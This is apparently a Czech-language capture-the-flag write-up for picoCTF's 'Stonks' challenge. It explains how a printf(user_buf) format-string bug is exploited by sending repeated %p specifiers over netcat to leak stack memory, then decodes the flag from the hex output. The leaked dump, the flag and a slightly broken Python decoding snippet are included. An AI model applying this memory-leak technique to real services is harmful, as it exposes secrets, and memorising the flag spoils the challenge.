----------------------------------------------------------
Popis
Rozhodl jsem se vyzkoušet něco, co ještě nikdo přede mnou neudělal. 
Vytvořil jsem bota, který za mě automaticky obchoduje s kameny pomocí umělé inteligence a strojového učení. 
Nevěřil bych vám, kdybyste mi řekli, že je to nezabezpečené! 
Vuln.c nc mercury.picoctf.net 6989
----------------------------------------------------------

1. Stáhněte si daný vstupní soubor 'vuln.c'.

2. Vyzkoušejte aplikaci stonks spuštěním daného příkazu 'nc mercury.picoctf.net 6989' v terminálu.
    
3. Zkontrolujte kód daného vstupního souboru
    - mezi řádky 66-72 je zmínka o příznaku
    - řádek 93 je pro nás klíčový
        - printf(user_buf);
        - vypisuje výsledek funkce 'user_buf', která je zmíněna pouze na řádku 89
            - na řádku 89 je pouze ukazatel uvnitř tohoto znaku
            - user_buf je deklarován jako char, takže správně by měl být vypsán s parametrem '%s' nebo něco takového
                - tuto chybu můžeme využít k přetečení paměti a vypsat nám skrytý token, který by neměl být viditelný pro veřejnost
                
4. Využití zranitelnosti
    - Spusťte aplikaci příkazem 'nc mercury.picoctf.net 6989'.
    - Vyberte 1 pro možnost '1) Kupte si nějaké kameny!
    - Pro odpověď na otázku 'What is your API token' použijte '%p' a podívejte se, co dostaneme
        - '0x88f3370'
        - zdá se to divné, zkusme použít '%p%p%p'
            - 0x99fc3900x804b0000x80489c3
            - Dobře, zdá se, že s větším počtem parametrů '%p' to roste, použijeme jich 100
                - '0x916e3f00x804b0000x80489c30xf7f8bd800xffffffff0x10x916c1600xf7f991100xf7f8bdc7(nil)0x916d1800x20x916e3d00x916e3f00x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x353861300x323565330xffa2007d0xf7fc6af80xf7f994400x478623000x1(nil)0xf7e28ce90xf7f9a0c00xf7f8b5c00xf7f8b0000xffa23a880xf7e1968d0xf7f8b5c00x8048eca0xffa23a94(nil)0xf7fadf090x804b0000xf7f8b0000xf7f8be200xffa23ac80xf7fb3d500xf7f8c8900x478623000xf7f8b0000x804b0000xffa23ac80x8048c860x916c1600xffa23ab40xffa23ac80x8048be90xf7f8b3fc(nil)0xffa23b7c0xffa23b740x10x10x916c1600x478623000xffa23ae0(nil)(nil)0xf7dcefa10xf7f8b0000xf7f8b000(nil)0xf7dcefa10x10xffa23b740xffa23b7c0xffa23b040x1(nil)0xf7f8b0000xf7fae70a0xf7fc6000(nil)0xf7f8b000(nil)(nil)0xbefb82510x43508441(nil)(nil)(nil)0x10x8048630(nil)0xf7fb3d500xf7fae9600x804b0000x10x8048630(nil)0x80486620x8048b85'
                - zjistíme, co se skrývá za tímto výstupem
                
               
5. Dekódujte zadaný výstup pomocí programu CyberChef
    - .n?..K...H..÷ø½.ÿÿÿ..l..÷ù..÷ø½Ç.m....n=..n?.ocip{FTC0l_I4_t5m_ll0m_y_y3n58a025e3ÿ¢.}÷üjø÷ù.@G.#..÷â.é÷ù À÷øµÀ÷ø°.ÿ¢:.÷á..÷øµÀ.Hì
ÿ¢:.÷úß .K..÷ø°.÷ø¾ ÿ¢:Č÷û=P÷øČ.G.#.÷ø°..K..ÿ¢:Č.HČ..l..ÿ¢:´ÿ¢:Č.H¾ ÷ø³üÿ¢;|ÿ¢;t...l..G.#.ÿ¢:à÷Üï¡÷ø°.÷ø°.÷Üï¡.ÿ¢;tÿ¢;|ÿ¢;..÷ø°.÷úç
÷ü`.÷ø°.¾û.QCP.A..Hc.÷û=P÷úé`.K....Hc..Hf..H¸.
    - uvnitř můžeme vidět nějaký příznak: "ocip{FTC0l_I4_t5m_ll0m_y_y3n58a025e3ÿ¢.}".
        - pojďme to správně rozebrat
            - odstraňte zbytečné části receit, abyste získali pouze druh příznaku:
                - 0x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x353861300x323565330xffa2007d0x
            - Použijte 2 recepty:
                - Z Hex s automatickým oddělovačem
                - Vyměňte koncovku s datovým formátem Hex a délkou slova 4 bajty.
            - jsme získali správný příznak :-) 
            
      BONUS      
            
        - jsme mohli také správně analyzovat pomocí pythonu v terminálu takto:
            - python
                s = 'ocip{FTC0l_I4_t5m_ll0m_y_y3n58a025e3ÿ¢.}'
                for x in range (0,len(s),4):
                    print (s[x+3]+s[x+2]+s[x+1]s[x],end='')
